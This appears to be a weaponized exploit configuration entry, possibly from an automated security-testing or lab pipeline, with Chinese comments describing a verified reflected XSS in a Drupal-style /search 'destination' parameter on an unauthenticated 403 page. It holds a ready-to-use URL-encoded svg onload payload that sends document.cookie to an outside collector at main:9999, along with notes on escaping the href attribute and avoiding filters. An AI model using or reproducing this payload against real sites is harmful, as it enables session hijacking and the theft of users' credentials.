[weaponize]
# 实测 (2026-08-21, destination 池验证): 免登录 GET。/search 的 destination 参数
# (Drupal 登录重定向参数) -> 未登录渲染 403 access-denied 页, 页内 sink blob 中
# <a href="/base/path?/search?destination="> 属性**裸反射** payload —— 与 mybb
# memberlistsearch 同形 (href 属性逃逸)。Firefox 照常渲染 403 响应体并执行
# 内联 JS (与 drupal-qpath 的 500 页同理), 实测 beacon 打穿拿到 secret。
# text/html; 标记落 ebb9de/6498b1/10792d 多个函数名下 (liveness 证据天然成立)。
# destination 池共 4 poc (admin/compact/on ×2 + search + user/1/edit), 取 /search
# 入口 (其余为 admin/用户页, 未登录殊途同归 403 登录页, 同形不重复立项)。
# 坑 (已内置规避): ①href 属性上下文, payload 需 "> 前缀逃逸; ②事件处理器含
# 空格必须整体放双引号 (未引号 HTML 属性值在首个空格截断); ③拼接用 .concat()
# 不用 +。页面资产指向 http://localhost/ (容器内即拒绝, 快速失败不 hang)。
kind           = "xss"
payload_url    = "http://webapp/search?destination=%22%3E%3Csvg%20onload%3D%22new%20Image%28%29.src%3D%27http%3A%2F%2Fmain%3A9999%2Fc%3Fd%3D%27.concat%28encodeURIComponent%28document.cookie%29%29%22%3E"
reflect_marker = "<svg onload="

